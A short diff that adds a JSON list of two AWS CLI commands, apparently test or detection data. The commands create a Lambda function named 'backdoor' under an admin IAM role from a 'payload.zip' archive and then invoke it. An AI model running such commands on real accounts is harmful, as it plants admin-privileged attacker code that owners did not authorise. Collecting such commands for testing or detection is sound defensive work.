@@ -1,0 +1,4 @@
+[
+  "aws lambda create-function --function-name backdoor --runtime python3.12 --handler index.handler --role arn:aws:iam::ACCOUNT:role/AdminRole --zip-file fileb://payload.zip",
+  "aws lambda invoke --function-name backdoor --payload '{}' output.json"
+]
